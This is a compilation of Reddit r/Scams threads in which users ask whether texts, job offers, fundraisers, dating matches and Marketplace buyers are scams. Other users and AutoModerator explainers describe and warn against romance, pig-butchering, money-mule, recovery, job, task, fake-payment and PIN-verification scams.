- Got the same text last week. If you don‚Äôt know who it is, it‚Äôs a scam. Always.
- Crypto. The end game is you "investing" in crypto and "her" taking our money.
- I had the same thing happen!  I cut off communication quickly.
- Another close call. Could be a scammer but probably just a lonely young woman looking for an older man for companionship and sex.

- Hi /u/vitaminxzy, AutoModerator has been summoned to explain the Wrong number scam.

An intentional wrong number text is the entry point to multiple different types of scams. Because these are so prevalent and lead to several unwelcome outcomes (including you confirming you have a live number, leading to more spam/scams), it is recommended that you do not reply to them, even out of courtesy. They hope to take your courtesy, parlay it into a conversation (often by commenting how nice you are and giving some suggestion of fate in meeting this way), and eventually deploy a scam.

If you received a wrong number inquiry that seems to assume a connection with you (e.g. seeking a specific friend, inquiring about a doctor‚Äôs appointment, asking about a business correspondence, etc.) and there are no pictures included, then you are likely at the beginning of a crypto scam. Use ! crypto without the space to get more info on crypto scams. You can see a video of this scam develop from wrong number to crypto scam at https://www.youtube.com/watch?v=CZ_flb9tGuc

If you receive a random text from a woman that is trying to play up a relationship/hook-up angle and includes an alluring photo, you have encountered what this subreddit often calls the Mandy scam, based on the name used in an early incarnation of it. The replies are sent by a bot and will give the same responses (with some slight variations) regardless of how you respond. The bot also has a few specialized responses that occur when you say words like 'bot' or 'scam'. After a series of replies, it will eventually push you to go to an adult/cam/age verification site. Here are some of the posts on r/scams about the Mandy scam: https://www.reddit.com/r/Scams/search?q=mandy&restrict_sr=on&include_over_18=on&sort=relevance&t=all, you can see that the images, names, and scenarios vary. You can report spam texts by forwarding them to 7726 (SPAM): https://www.consumer.ftc.gov/articles/how-recognize-and-report-spam-text-messages

There is also some evidence that intentional wrong number texts can be part of a data-gathering exercise where each bit of info you give (e.g 'Hi Susan!' and you reply with your name out of courtesy) is collected to be used against you in other scams. Thanks to redditor teratical for this script.

- Do they just start giving a sob story after a while? I‚Äôve never had this happen. I mean, it felt fishy right from the hop.
- Hi /u/Mark12547, AutoModerator has been summoned to explain the Romance scam.

Romance scammers pretend to be in love with their victims in order to ask them for money. They sometimes spend months grooming their victims, often pretending to be [members of military](https://www.cid.army.mil/romancescam.html), [oil workers or doctors](https://www.consumer.ftc.gov/articles/what-you-need-know-about-romance-scams). They tend to be extremely good at taking money from their victims again and again, leading many to [financial ruin](https://globalnews.ca/news/5095659/romance-scam-money/). Romance scam victims are emotionally invested in their relationship with the scammer, and will often ignore evidence they are being scammed.

If you know someone who is involved in a romance scam, beware that convincing a romance scam victim they are scammed is extremely difficult. We suggest that you sit down together to watch Dr. Phil's shows on romance scammers or episodes of Catfish - sometimes victims find it easier to accept information from TV shows than from their family. A good introduction to the topic is this video: https://youtu.be/PNWM5nuOExI -

- Just block and ignore them. Any engagement with these people is to their advantage, not yours.
- In one case, after several weeks, they asked my friend so send bus fare so she could visit him, but instead of coming she supposedly used the money towards her mother's operation and wanted more money for bus fare. She also asked my friend to receive packages and mail them to some address because her grandmother wouldn't allow packages to be delivered to their house. Eventually the amount the scammer asked for went up (more expensive medical expenses, money needed for utilities because the breadwinner is still recovering).

Oh yes, the two attempts with my friend and one with my wife sent pictures of beautiful people and claimed they were them, never had a live video call, and never got around to meeting in person.
- If it's a romance scam, they'll usually just ask for money; "I need money for the plane ticket to visit you", or "I was in a car wreck and need money for hospital bills". If it's a crypto scam they'll start talking about how much money they're making and push you to open your own account on the site they control.
- Hi /u/ditzen, AutoModerator has been summoned to explain the Pig butchering scam.

It is called [pig butchering](https://www.forbes.com/sites/jasonbrett/2023/12/26/new-pig-butchering-crypto-scam-includes-victims-in-us-and-overseas/?sh=2837fb975eaa) because scammers use intricate scripts to \"fatten up\" the victim (gaining their trust over days, weeks or months) before the \"slaughter\" (taking them for all of their money). This scam often starts with what appears to be a harmless wrong number text or message. When the victim responds to say it is the wrong number, the scammer tries to start a friendship with the victim. These conversations can be platonic or romantic in nature, but they all have the same goal- to gain the trust of the victim in order to get them ready for the crypto scam they have planned.

The scammer often claims to be wealthy and/or to have a wealthy family member who got wealthy investing, often in crypto currency. The victim is eventually encouraged to try out a (fake) crypto currency investment website, which will appear to show that they are earning a lot of money on their initial investment. The scammer may even encourage the victim to attempt a withdrawal that does go through, further convincing the victim that everything is legit. The victim is then pressured to invest significantly more money, even their entire net worth. Sometimes pig butchering scams don't involve crypto, but other means of sending money (like bank wires, gift cards or even cash pickups).

Eventually, the scammer will find an excuse why the account is frozen (e.g. for fraud, because supposed taxes are owed, etc) and may try to further extort the victim to give them even more money in order to gain access to the funds. By this time, the victim will never gain access and their money is gone. Many victims lose tens of thousands, hundreds of thousands, or even millions of dollars. Often, the scammers themselves are [victims of human trafficking](https://www.vice.com/en/article/n7zb5d/pig-butchering-scam-cambodia-trafficking), performing these scams under threats of violence. If you are caught up in this scam, it is important that you do not send any more money for any reason, and contact law enforcement to report it. Thanks to user Mediocre_Airport_576 for this script.

- Thank you. I blocked and deleted.
- Holy shit. That sounds like a nightmare.
- It can be. The friend sent money he really couldn't afford to lose. The receiving and forwarding packages sounds like he could potentially end up the fall guy for fraudulent purchases and fortunately he recognized it in short order. (If her "friend" could have the packages sent to where he was living, why couldn't the "friend" have the packages sent to the destination address itself instead of going through our friend?) But it took a long time before we could convince him that he was being scammed and he had no way of knowing whether the pictures she sent him were really her or pictures of someone else that she is pretending to be.
- I was thinking of having ‚Äúher‚Äù send me a picture of herself holding a coffee cup in her right hand, upside down, with a nickel, dime, and piece of chewed gum under a quarter, all on the bottom of the cup. Then I figured that AI might be able to do that now.

Title: Well-known scam, but this time it looks different
Body: Hi everybody! I have some doubts to share. You know that kind of scam where scammers ask you to complete tasks like liking posts in exchange for money? We all know it by now. After a while of talking (I was just mocking them, I would never pay them a cent), the scammer came up with this phrase:

"If you can‚Äôt continue with the previous task, I have a long-term part-time job here that requires no investment from you. If you're interested, I can provide more details. This is a simple job.

The main task involves helping us collect payments. I will transfer the money to your bank account, and you‚Äôll just need to confirm if you‚Äôve received the payment. Each time you receive a certain amount, you will need to transfer it to the company.

There are no fees to pay, and we will pay you in advance.‚Äù

This clearly sounds like money laundering to me. Has this ever happened to any of you?

- This is money laundering. You will go to prison.

Or money from the victims the scammers are stealing from will go into your accounts. You will be the fall guy. You will go to prison.

Or all the money they send you gets clawed back because the transfers or checks are fraudulent. You lose thousands or tens of thousands of dollars and get blacklisted by the banking system for the next decade.
- Definitely a money launering/mopey mule scam.

If scammers can't get you one way, they have no problem rolling right into Plan B.

This is also why we advise against talking with scammers at all. You knew the task bit was a scam, but now you've got questions. Even if you don't fall for it, many other people who don't know better will.
- No, because we don't talk to people who we know are trying to scam us.
- Yes it's just money laundering for the scammer, making you the "fall guy".
- Don't trust people trying to steal from you
- I know someone that did this ‚Äújob‚Äù in the 20s.  It was years ago and it was done with checks.  He ended up losing all his savings, nearly $5k.
- Task scammers have been known to convince people who they had paid already once with crypto, to now allow access to their crypto account 'so they can send them all the money they are owed.'  Except what they do with that access is to empty out the account.

I imagine it would not be too hard to work somebody's bank account like that also.
- Sigh... This is why the sub highly discourages engaging scammers. 

Yes it's a scam. They want to use you as a money mule. 

Do you think it makes sense for ANY company to ask a random internet stranger to collect payment on their behalf? Isn't that kinda risky for the company?

Only scammers do this because it's not their money and they need some patsy to take the fall. 

Stop trying to mess with scammers, all you're doing is poking the snake hoping you won't get bit.
- These are, many times, professional criminals. Don't engage with them at all. They can talk and you think you're mocking them, but they're extracting information from you. Plus, lifes too short. Don't engage with scammers.
- No, because it don't engage with scammers. You shouldn't, either. If you have to ask the sub what is going on, you are in no position to scambait.
- Added bonus you have to live with yourself knowing that you helped facilitate scammers stealing money from innocent victims.
- This could also be a fake check scam.
- This man knows what he's talking about
- >mopey mule

Can we make (exclamation)eeyore the/a tag for the money laundering automod response?
- A lot of people seem to think scammers are robots that are only programmed to scam one way. But they‚Äôre actually pulling all sorts of scams and combinations of scams all at the same time.

Definitely why you shouldn‚Äôt mess with them
- You'd think that's one of these "well duh" moments, but reading this subreddit showed me it's clearly not.
- Literally mentioned in my post.
- Thanks for noticin'.
- Some people are just too blinded by the thought of a massive payday than see the obvious scam in front of them.
- Apologies, did not read your post thoroughly and carefully enough.

Title: Is my friend being scammed by this Go Fund Me campaign?
Body: I think my friend is being scammed and it‚Äôs been going on for MONTHS. 

I have a friend who sometimes isn‚Äôt quite there mental health-wise and I think this leads him to be quite gullible. For the past few months ALL of his energy and effort have gone into trying to raise money for a ‚Äúfriend‚Äù that lives in Gaza. Every social media post is begging his friends to donate money, every text, it‚Äôs constant. 

Today I got another text begging to donate to a Go Fund Me for this ‚Äúfriend‚Äù and their family. 

It all just feels off to me but I don‚Äôt know how to do reverse image searches or anything to prove that my gut is correct!

I took screenshots and saved the images in the Go Fund Me and attached them to this post.

- No-one in Gaza is raising funds on that site or any other site. They are all scams. Wanting to help those in Gaza by donations means donating to legitimate charities that have been household names for decades.
- It's odd how many "Dinas" in Gaza all happen to have different GoFundMes going

https://preview.redd.it/ae0vpoznj7ee1.png?width=1080&format=png&auto=webp&s=919efdb7189207484f885be0a2ce160feba15ef0
- Nobody in Gaza would have access to get gofundme money. For sure a scam
- Yes. I think it‚Äôs a scam. And those names of the kids are interesting.
- It's hard to ignore someone in need, but if your friend really wants to help, he should donate to a highly rated charity on charity navigator. That way he knows his money isn't going to some scammer laughing his ass off at playing him like a fiddle.


Charities have the resources and organization to get deals on supplies, and have ways of getting what's needed to the people who need help. So even if this wasn't a scam, donating to a good charity lets him help more people with the same money.
- Hideous though it is to contemplate, the horrorshow in Gaza is being used by millions of scammers. They are the lowest of the low. There's no way to verify any of these. Your friend's kind heart is being manipulated.

Donate to a reputable emergency relief organization, not to unknown individuals with photos on social media. Even if those weren't scams, your money will go farther if you send it to Islamic Relief, Doctors without Borders, IRAP, the International Rescue Committee, or any organization with a top score on Charity Navigator and Guidestar.

Edit: Report this to GoFundMe. They should shut it down.
- Gofundmes are usually scams.
- Yes he probably is. Photos that we see from news organizations show people standing in line  to receive food from charity organizations. I doubt that anyone in Gaza has WiFi or cell service. Much of the money donated via GoFundMe or social media is going to scammers, or it's going to terrorist organizations  in to buy weapons. If someone wants to help people there, or in LA or Sudan or Florida, anywhere that people have been affected by catastrophe, there are a lot of real charitable organizations like Red Cross or Doctors Without Borders. There is a PSA about LA wildfires, pinned to r/scams landing page, which lists actual legitimate charitable sites that really help people.
- A fool and his/her money will soon parted.
- Of course it‚Äôs a scam! What in the world is a few donations going to do to help anyone in another country?!! What is $5.00 going to do to help????

The names of the children are ridiculous. 

They need to stop donating money immediately.

The photos are comical! Amazing how they write in English so well! The photos of the rubbble are just random photos. Not even their house.

It‚Äôs an absolute scam.

This is just as ridiculous as the Gypsies playing the fake violin in the parking lot scam!

- Wow!
- Why not? I'm not saying this one is legit but why wouldn't they have access to it?
- Agreed. I just can‚Äôt find a way to prove it to my friend so he stops donating money. It‚Äôs so frustrating.
- Those kids names are very often used names in Palestine fyi
- I'm not saying it's legit or not, but those names are real arabic names.
- I do think this is a scam, but I‚Äôm so interested in the people criticizing the names. These are very typical Palestinian names.
- >See's a picture of a pharmacist and some children

>THEY'RE TERRORISTS

There's something wrong with your brain.
- This might be helpful. Anything I can send along to prove that they are getting scammed. I replied and said I wouldn‚Äôt donate and that it was a scam and he said he spoke to ‚ÄúDina‚Äù nearly every day and even on the phone/video. So he is fully convinced that this is real ü§∑‚Äç‚ôÄÔ∏è
- That is frustrating. I‚Äôm sorry.
- When I said ridiculous, I meant that the names just so happened to be the most common names one could think of. It‚Äôs equivalent to if the names happened to be John Smith, Mike Scott, etc. 

It‚Äôs interesting that the names they chose happen to be used in other scams and are so common. Scammers using common names is a big red flag.

Title: AI voice spam call scam??
Body: Has anyone been getting these calls? They've been calling me everyday for the past 4 days now just asking "Hello, am I speaking to [my name with the last name mispronounced]?". And when I try answering, they just repeat the question. At first I thought it was just a normal person calling, but they've been having the same voice and same intonation that now I think it's an AI generated voice.

It's getting frustrating because they've been calling everyday with a different phone number, so I can't even block the caller.

- Don't answer your phone. Anyone you want to speak to will leave a message. 

Scroll this sub for all the people who regret answering their phone.
- Set your phone to send unknown callers to voicemail automatically.
- It's a scam, or it's some company trying to sell you something. Either way, everyone gets these calls, some people get 10-20-30 calls a day. Probably from a robocall system, they automatically call hundreds of numbers a day.

Do not answer calls from unknow numbers. If you answer, they know your phone number is active, and you'll get more calls.

Here is something that may work: when the phone rings, answer but do not say anything. Wait silently for 30 seconds, then hang up. Another Redditor reports that it has reduced the calls they get (it fools the automated robocall system).

The phone number displayed is probably not their real number, it belongs to some innocent person who knows nothing about the calls. The scammers use technology to spoof the number they're calling from -- so the number displayed on your phone has your area code, or it may even appear to be from your local police; but they are actually calling from across the country, or from somewhere in Asia.
- Has NOTHING to do with AI. Text to voice generators have been around for 50 years.
- That is true, thanks

- Not sure how exactly you got scammed since your post didn‚Äôt have much details. But regardless, scammers tend to use methods that ensure recovery of your money is nigh impossible (such as gift cards, crypto, authorized bank transfers, PayPal Friends and Family etc).

Scammers also lurk subs like these for people asking about recovery and DM them saying they can help. Do not listen to anyone in your DMs saying they are someone or recommend someone who can get your money back. They are what we call !recovery scammers (see the automated reply to me for more info)

- Hi /u/Applauce, AutoModerator has been summoned to explain the Recovery scam.

[Recovery scams](https://www.consumer.ftc.gov/articles/0102-refund-and-recovery-scams) target people who have already fallen for a scam. The scammer may contact you, or may advertise their services online. They will usually either offer to help you recover your funds, or will tell you that your funds have already been recovered and they will help you access them. In cases where they say they will help you recover your funds, they usually call themselves either \"recovery agents\" or hackers.

When they tell you that your funds have already been recovered, they may impersonate a law enforcement, a government official, a lawyer, or anyone else along those lines. Recovery scams are simply [advance-fee](https://en.wikipedia.org/wiki/Advance-fee_scam) scams that are specifically targeted at scam victims. When a victim pays a recovery scammer, the scammer will keep stringing them along while asking for increasingly absurd fees/expenses/deposits/insurance/whatever until the victim stops paying.

If you have been scammed in the past, make sure you are aware of recovery scams so that you are not scammed a second time. If you are currently engaging with a recovery scammer, you should block them and be very wary of random contact for some time. It's normal for posters on this subreddit to be contacted by recovery scammers after posting, and they often ask you to delete your post so that you both cannot receive legitimate advice, and cannot be targeted by other recovery scammers.

Remember: never take advice in private. If someone reaches you in private after posting your scam story, it is because a scammer will always try to hide from the oversight of our community members. A legitimate community member will offer advice in the open, for everyone to see. Anyone suggesting you should reach out to a hacker is scamming you.

- No problem! Remember to only go through whatever platform you used to send the scammers your money (i.e. your bank, PayPal, Zelle, etc). If they say they can't get it, unfortunately you're out of luck

Title: Tinder match turns out fake - but gives real Insta handle and attempts NOTHING
Body: I matched on Tinder with a local woman. Same age, normal profile etc. Very standard conversation. I commented on the big bouquet of flowers on one of her pictures, we joked about that. I suggested going for a walk, she said maybe next week where she had more time (very very typical answer I find).

I tell her I'd delete Tinder and give her my Instagram handle. She answer later same day that she can't find me, then gives me her handle.

On insta I add her and she immediately texts me about a fake profile being active. We discuss it and none of us see what a scammer stands to gain here? Note this is the real person, whose pictures where used on the fake Tinder account.

At no point did the scammer ask me for personal information, suggest a particular meeting point, seem eager to reply. Would have said minimum risk of a fake profile until the Insta chat.

I was surprised at:   
1) the very normal conversation with classic no motive like suggesting I pay for something or whatever  
2) the person chose to give me the real IG handle - why not just link to a fake IG or say they don't use it

- Give it time. Some of them play a longer game to let you relax and let your guard down. Why would she give you an insta handle for an account she's stealing photos from though?
- Could also be an ex partner who made a fake profile to get people to harass this woman. Some people might not be as understanding and get angry.
- Sometimes people create fake profiles of other people that they either want to harass or are obsessed with themselves. Maybe an ex boyfriend, maybe a stalker, who knows.

This is like when you see "for a good time call me at xxx-xxx-xxxx!" on a bathroom stall. You think that the phone number is really the person who wrote it??
- If I‚Äôm understanding correctly, this person is using this real woman to catfish? I had a male friend who had a fake profile of them in the same city and everything, like this woman. People are just weird. Maybe to get nudes, boredom, do a bait and switch when they show up and look different.
- My first thought was maybe there's someone who reads her IG messages or comments sometimes and she doesn't want him to know that she's on Tinder. Just a hunch though.
- Scammers playing the long game seems like a legit concern.
A friend of my MIL got 'friendlied' for 6 months then scammed out of big money.
- Until you meet in person you don‚Äôt know that she‚Äôs local.
- Could be the same woman (fake tinder and insta) who is now claiming she was never on Tinder so she can say it was fate that brought you together. Be cautious.
- Some people love to get nudes and the blackmail starts.
- Maybe this woman had her account stolen and just got it back? If that's not the case, then definitely it sounds like a case of targeted harassment against the woman.
- catfish, and sometimes they just want to e someone else,but it could be that he was trying to build a relationship with you before the emergency and they don't know how there ever going to pay for this or that
- Well that's what I'm wondering.

The person seems clearly to not play a longer game. I mean it was over the minute I added the real person. Except for the risk that the Insta user is fake too.
- Thought about that possibility too. Although there again it would make more sense if the chat had been different.
- Yes, maybe you just ran into a classic catfish
- Yes indeed the real woman. Sounds like it could be the same here. But again, why ever give me the real IG handle and immediately get found out? They also deleted the Tinder match right after I added the IG - suggesting they keep track of her follower count
- That would be a wild twist to this! Well anything is possible here.
- But that would require the Insta user to be fake too. And it has been up for at least 8 years.
- True. I should rather just say it's at least a very convincing Insta profile.
- Not stolen, it seems.
I think indeed it's harassment.
- Of course the Insta user is fake. They might have a model handy that matches the photos but that doesn't mean they aren't running some kind of long con.
- With others it might have been different, hopefully she stays safe and this doesn‚Äôt escalate.
- Right. But isn't classic catfishing about meeting the person? There was apparently no real attempt at that here.
- Is this woman an influencer? With a lot of followers? 

They could also just be new to catfishing/scamming lol just bad it.
- Scammers also use stolen social media accounts.
- It's possible. But 'of course' is a very strong wording. I'd say it's very probable that it is indeed the real Insta.
- Agree on both points indeed!
- Most classic catfish (like in the original tv show/movie of that name) don‚Äôt want to meet. It‚Äôs about a fantasy/money.
- No, actually lower follower count than average, but within normal range. 

True. Certainly seems very bad at it.

"Sorry to intrude! my name is Pierce I want to make you aware of an available position that may be suitable for you. Do you have a minute to chat?"

- Know that unless you have unique, long expertise and or desirable skills, the chances of recruiters contacting you out of the blue are very slim.

These often end up !job scams (the !task scams are very common)
- The text is non-specific or generic as if the message was sent to many people. It looks like a scam.
- "Sorry to intrude!"

This means I never gave you permission to contact me, delete and move on.
- They know nothing about you. That's one reason it's vague.

Had someone post hear last week, says he gets a few of these each week. But he's been retired for years  not looking for work.
- Most job offers for remote or work from home jobs are scams. If you're currently looking for a job, spend a little time here to get familiar with !job scams so you recognize the signs.

Some red flags:

- contacted  on WhatsApp, Instagram, or other social media

- vague impersonal info on their emails to you, like "Dear Applicant"

- interview by text only

- hired right after interview, or hired without interview

- the pay is much too high for the job tasks (US $30 per hour for simple stuff that the average 12 year old could do)

- you have to pay them for something, or "invest" your own money

- they want to send you a check for you to buy equipment (fraud / money laundering)

- job involves re-shipping packages (parcel mule)
- This seems really fishy!

 Legit recruiters don‚Äôt usually text you out of the blue like this. If they ask for personal info or money, it‚Äôs definitely a scam. 

Be careful and block them if you can! Real jobs usually give clear details and talk to you professionally.
- Did the 'recruiter' name you directly? Did the recruiter mention any details of the available position or why you in particular may be qualified for the role? No? Then what distinguishes this from a scammer distributing bulk text messages?

The answer is they don't know you're looking. They're spamming out requests for victims for a !job scam.
- Hi /u/vitaminxzy, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

- Hi /u/vitaminxzy, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

The goal of this scam is to get people to download the app for easy money and then encourage them to pay to get to the next level. It's impossible to get your \"earnings\" out of the app, so victims will have wasted their time and money. This type of scam preys on the [sunk cost fallacy](https://en.wikipedia.org/wiki/Sunk_cost#Fallacy_effect), because people demonstrate a greater tendency to continue an endeavor once an investment has been made, and refusing to succumb to what may be described as cutting one's losses.

If you're involved in a task scam, cut your losses. Beware of recovery scammers suggesting you should hire a hacker that can help you retrieve the money you already invested. They can't, it's a trick to make you lose more money. Thanks to redditor vignoniana for this script.

Title: Possible indeed job scam?
Body: So I applied to this solar sales setter job on the 17th, and that day someone from the account messaged me on indeed and we set up an interview that was done through indeed. And then I was added to a group chat with him and the hiring manager, and I did a phone call interview with the hiring manager. I‚Äôm a little suspicious because I know there are weird scams on indeed. The company is called legacy power, on indeed it was LGCY power. It seems like a legit company but I don‚Äôt really have any solid proof that these two guys actually work for legacy power? Everything that they‚Äôre saying about the job and the hiring seems legit, but I‚Äôm just paranoid. I don‚Äôt want to put any sensitive information anywhere as we do when getting jobs if I think this isn‚Äôt real. Any thoughts?

- Try to find out if they're legit; call them or insist on a zoom face to face, ask for emails directly from their company website to verify it's really them before providing sensitive information. 

As for the company itself, googling it seems the concerns is them not being very transparent and saying to clients they'd get a "free" solar panel in the sales pitch. The position sounds like it's a commission based high pressure direct sales type job. You'll maybe have to do cold calls or maybe door to door to get sales. A lot of people advise avoiding these, as you'd really have to grind to get sales yourself... or some shady companies will have you pay to get leads etc

r/devilcorp has a thread that explain these jobs:  [https://www.reddit.com/r/Devilcorp/comments/vs5i8m/welcome\_to\_rdevilcorp\_what\_you\_need\_to\_know\_and/](https://www.reddit.com/r/Devilcorp/comments/vs5i8m/welcome_to_rdevilcorp_what_you_need_to_know_and/)
- Legit companies don't hire/recruit through "chat groups" It's probably a task scam or fake check scam
- It is commission based and D2D, he said that I will fly out with them and get assigned a neighborhood. I don‚Äôt mind grinding for the sales because he also said that one sale can be worth 3k in commission.
- A group chat is different from a chat group. And, yes, high turnover jobs like this definitely recruit this way.
- Edited my reply above, but yeah just make sure you're sure you're talking to said company and confirm they are who they say they are.  If any more red flags for you pop up (upfront advance fees, or saying you need to pay for licences etc) then I'd bail out.
- Yes I‚Äôm waiting on the dealbreaker red flag, I‚Äôve seen a lot of things like this on indeed and other places, such as one wanting to charge me 100 dollars for a background check. I did a face to face interview with the first guy on indeed. The second guy was just a regular phone call but he said we would zoom call next in a few days. I then received an onboarding email that seems legit as well.

- Yea, it's a scam which can go many ways depending on the script.

It could be a !pin scam or !fakepayment scam.

Just report and block. No need to experiment further
- Any attempt to go off platform should be seen as a huge red flag.
- I had to erase my comment as I was about to ask who on this green earth sells a 6 year old TV with no remote & knocks only $75 off the price.

I lack attention to detail.
- Calling the stuff they are apparently interested in "item", instead of actual name may well signal that they are scammers copy pasting the same message in hopes of finding a mark.
- Facebook marketplace is for cash pickups only.
- To save time, just immediately block anyone who asks you to text or email them, as well as anyone who says they are out of town and want to pay upfront. These are almost always indicators of a fake payment scam.
- "The item" and "where are you located? " after they can see that üòÜ
- My list of Facebook Marketplace/Craigslist/OfferUp red flags...

**Avoid anyone who wants to:**

\- immediately move off-platform

\- pay by check

\- pay in advance

\- use a peer-to-peer payment app (Paypal, Venmo, Zelle, etc) ‚Äì might be OK in person (there's a debate amongst sub members), but never when not meeting in person

\- send a different person (including movers, courier, or delivery company) to pick up the item

\- offer more than your asking price

99% of accounts who bring up any of these things are overseas scammers.
- Give them an address in San Francisco. You'll know right away.
- [removed]
- A man - ‚Äúmy dad‚Äù no less - wanting to buy a crib lol
‚ÄúThe item‚Äù
I have sold and bought for friends but it never looks like this. I have a genuine conversation, and never give out my number or say ‚Äúconsider it sold‚Äù in like the first msg
- Haha that +1, also.
- Simple. Have your son give me cash when he picks it up. No? Sorry it didn't work out
- Anytime someone says 'text this number or 'email me at' I tred no further
- Wow, a fully automated scam script. Wonder how many fish he catches every week.
- Moving communication off the platform is almost always a scam.

The person with the facebook account can do the transaction if they want to help their dad buy something from facebook.
- When it's somone to represent another person red flag, giving a phone number trying to get you off the app is a scam, and you will eventually learn from your mistake. Even I made a similar mistake from nearly three years of a similar scam.
- Yes, a scam. Block them now. This type of scam has been posted before.
- yes this is a scam and don't ever send anyone(aside from someone you trust like a family or friend) your personal info
- known scam, block and ignore
- Mention of another person who doesn‚Äôt have an account of some kind = scam

ONLY ‚Äúhere‚Äôs the cash, give me the thing‚Äù is not scam.
- I don‚Äôt have Facebook.

I constantly have to have my daughter or ex wife reach out to people like this when I wanna buy something. 

My ex wife also lists shit for sale for me, weeds through the scam shit, and sends my number to potential buyers telling them her ex husband is selling it and to text him.

- Hi /u/Faust09th, AutoModerator has been summoned to explain the Fake payment scam.

The fake payment scam occurs when someone tries to trick you into thinking that you have received a legitimate payment when no such payment has been made. The most common method they use is sending you an email meant to look like a payment confirmation. In some cases the emails will be almost indistinguishable to a legitimate email sent by the payment service. Scammers are known to also show you screenshots instead of an email. Never trust a screenshot a stranger shows you, because it is probably doctored.

Scammers [spoof](https://en.wikipedia.org/wiki/Email_spoofing) the 'from' email to match an official address, and make you think you received a legitimate email. To combat a fake payment scam, verify online payments by logging in directly to the service. Do not check your junk folder, and do not assume a payment is legitimate based on an email alone. If a payment isn't reflected on your account and the person you are dealing with insists they have sent it, call support and ask about it. [Here](https://i.imgur.com/X9xn8uw.jpg) is an image of a scammer trying to pull off a fake payment scam. There is also a variant of the fake payment scam where you will receive a legitimate but fraudulent payment.

A variant of the fake payment email is just an advance fee scam: the scammer tries to convince you that your funds are on hold, and that you have to upgrade your account by sending the scammer some money to authorize the payment. No payment processor works like this. If you think you're dealing with a scammer, you're probably right. Always trust your gut.

- Hi /u/Faust09th, AutoModerator has been summoned to explain the Pin verification scam.

You will receive a legitimate authentication text from a company like Google, Craigslist, or Microsoft, and you will also have someone else asking you for the pin. Sometimes the scam starts on Craigslist, and the scammer will ask you to verify that you are a real person, and will say that Craigslist has many scammers which is why they want to verify you. Sometimes you will receive a random authentication text, and the scammer will text you without any previous contact.

The goal of the scammer can be to verify accounts that require phone verification, verify postings that require phone authentication, or to steal your social media accounts via a password reset pin that you shouldn't share with anyone ever. [Here](https://computertutorflorida.com/2019/01/the-verification-code-scam/) are two [articles](https://www.usatoday.com/story/tech/talkingtech/2019/04/01/new-scam-targets-cell-phone-accounts-pretending-your-carrier/3331376002/) about this scam.

- Right? That TV is worth about $25 from a non scammer if your lucky given no remote, they have to pick it up, and it‚Äôs 6 years old. TVs depreciate immediately, it wasn‚Äôt worth $625 the day after they bought it
- Oooooo good point
- This why I include the actual thing for sale when I message a seller.

Although, I too no longer have FB so I would have to have my wife message them and go off platform...
- I don‚Äôt know how many times we need to keep telling people this.
- And do not give home address. Meet them somewhere close in public, like a police station or store.
- Please explain the scam when they wanna pay u upfront? Do they ask u for your checking info to ‚Äúsend u money‚Äù?
- Don‚Äôt forget the who-cares sob story about why they can‚Äôt come in person
- Also, when they ask you to mark the item as sold immediately.
- Either of these places:  
The geographic center of the United States is northeast of **Belle Fourche in Butte County, South Dakota** ( 44¬∞58‚Ä≤N 103¬∞46‚Ä≤W), while that of the contiguous 48 states is near Lebanon in Smith County, Kansas ( 39¬∞50‚Ä≤N 98¬∞35‚Ä≤W).
- lol ya I made the item for sale outrageous on purpose. I‚Äôm selling a crib
- Yeah i also dont have facebook but i just get a mate to take care of the whole thing and i pay cash
- [deleted]
- His dad found out about this crib how?
No FB acct.
How old is kid asking about a crib for dad?
Is dad expecting a baby ?
I think dad has a side piece that his kid hasnt somehow realized yet, and ironically asking on behalf of his dad for his soon half sibling
Weird world, but im just guessing and makin up sht
- A hilarious reply would have been "Oh, dang... I just noticed I put 'dog house'... stupid autocorrect. I meant 'fender from a 2017 Toyota Camry'. Sorry about that"
- Infinity and beyond.
- Until you figure out how to have everybody know the same things.
- When someone who doesn‚Äôt have Facebook is asking you to mark it as sold. lol
- I personally enjoyed that touch üòÇ what if it was actually the dad, and he happened to be in the market for a crib AND a TV?? He would have been really disappointed if you set him up for a great score on the TV!
- Makes sense. I don‚Äôt want to owe my ex wife any favors or my kid meeting up with randos at 17, so this is my best compromise
- lol read the post again. There is no tv. I‚Äôm actually selling a crib.

Title: Regal Management MLM scam
Body: [TLDR: This is a scam MLM job doing cold calls and not a real marketing firm. Felt the need to post since I hadn‚Äôt seen any posts about this company when trying to do my own research.] 

So I searched if this company was a scam on the internet, but I couldn‚Äôt find anything.  I accepted the interview anyways and took one for the team. 

Regal Management out of Atlanta is basically some weird MLM AT&T call center. They advertise that they are a marketing firm. They told me they hire internally and one day I could be a manager then maybe own my own market ü§©. Just some spooky pyramid scheme. Their website ain‚Äôt half bad I will say but the google reviews were super suspicious. I mean they have all sorts of company pictures that are not stock photos. They put their time into it. I‚Äôll give them that. 

As someone who has had a really hard time finding jobs after being laid off, I was like if it‚Äôs real, then cool. If not, I have 10 minutes to waste that may help someone. Hopefully this will come up in someone‚Äôs Google search and save them time now.

Title: Is my turrior legit?
Body: I've been searching for a remote job and I found this site called my.turrior.com. They ask to set a profile, as usual in this HR sites.

